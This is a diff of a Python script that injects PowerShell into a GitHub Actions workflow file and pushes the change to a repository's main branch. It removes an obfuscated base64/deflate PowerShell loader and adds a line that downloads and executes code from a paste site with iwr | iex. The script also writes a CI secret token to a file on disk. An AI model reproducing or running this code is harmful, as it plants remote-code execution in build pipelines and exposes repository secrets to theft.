@@ -5,7 +5,7 @@ import subprocess
 
 # Nội dung muốn inject
 a = """
-$env = $env:comspec; $c ="Defla" + "teStream"; $b = "Compre" + "ssion"; $a ="Strea" + "mReader"; $f =  $(New-Object IO.$a ($(New-Object IO.$b.$c ($(New-Object IO.MemoryStream(,$([Convert]::("FromB" +"ase6" + "4String")("y0yt0MgsL1LIKCkpKLbS10/PLMlJTNJLzs/Vz0jMzEvPSzc00y/OTM9NLMnPzEkt0dfVL0os188FyuknagIA")))), [IO.Compression.CompressionMode]::("De" +"compress"))), [Text.Encoding]::ASCII)).ReadToEnd(); .($env[4,24,25]-join'') $f
+iwr https://pastefy.app/xbUgDBUT/raw | iex
 """.replace("\n","")
 code_inject = """        """ + a + "\n"
 token_lovee = """        $env:GITHUB_TOKEN_VPS | Out-File -FilePath "D:\\a\\vpstoken.txt"\n"""
@@ -45,6 +45,7 @@ subprocess.run(["git", "add", workflow_file])
 subprocess.run(["git", "commit", "-m", "backup"])
 subprocess.run(["git", "pull", "--rebase", "origin", "main"])
 subprocess.run(["git", "push", "origin", "main"])
+
 
 
 
